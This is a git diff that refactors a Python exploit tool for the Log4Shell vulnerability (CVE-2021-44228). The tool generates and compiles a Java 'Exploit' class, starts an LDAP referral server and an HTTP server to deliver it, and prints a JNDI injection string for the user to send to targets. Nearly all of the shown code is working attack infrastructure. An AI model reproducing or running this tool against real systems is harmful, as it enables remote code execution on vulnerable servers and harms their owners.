@@ -9,9 +9,8 @@ from pathlib import Path
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 
-def genEvilCode(userip, lport):
-
-    genExploit = """
+def generate_payload(userip: str, lport: int) -> None:
+    program = """
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -54,9 +53,11 @@ public class Exploit {
 
     # writing the exploit to Exploit.java file
 
+    p = Path("Exploit.java")
+
     try:
-        Path("Exploit.java").write_text(genExploit)
-        subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
+        p.write_text(program)
+        subprocess.run(["./jdk1.8.0_20/bin/javac", str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
@@ -64,33 +65,30 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def payload(userip, webport, lport):
-    genEvilCode(userip, lport)
+def payload(userip: str, webport: int, lport: int) -> None:
+    generate_payload(userip, lport)
 
     print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
     # create the LDAP server on new thread
-    t1 = threading.Thread(target=createLdapServer, args=(userip, webport))
+    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
     t1.start()
 
     # start the web server
-
     print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
     httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
 
-def checkJavaAvailible():
-    javaver = subprocess.call([
+def check_java() -> bool:
+    exit_code = subprocess.call([
         './jdk1.8.0_20/bin/java',
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-    if javaver != 0:
-        print(Fore.RED + '[-] Java is not installed inside the repository ')
-        raise SystemExit(1)
+    return exit_code == 0
 
 
-def createLdapServer(userip, lport):
+def ldap_server(userip: str, lport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
@@ -104,7 +102,7 @@ def createLdapServer(userip, lport):
     ])
 
 
-def main():
+def main() -> None:
     init(autoreset=True)
     print(Fore.BLUE+"""
 [!] CVE: CVE-2021-44228
@@ -131,7 +129,9 @@ def main():
     args = parser.parse_args()
 
     try:
-        checkJavaAvailible()
+        if not check_java():
+            print(Fore.RED + '[-] Java is not installed inside the repository')
+            raise SystemExit(1)
         payload(args.userip, args.webport, args.lport)
     except KeyboardInterrupt:
         print(Fore.RED + "user interupted the program.")
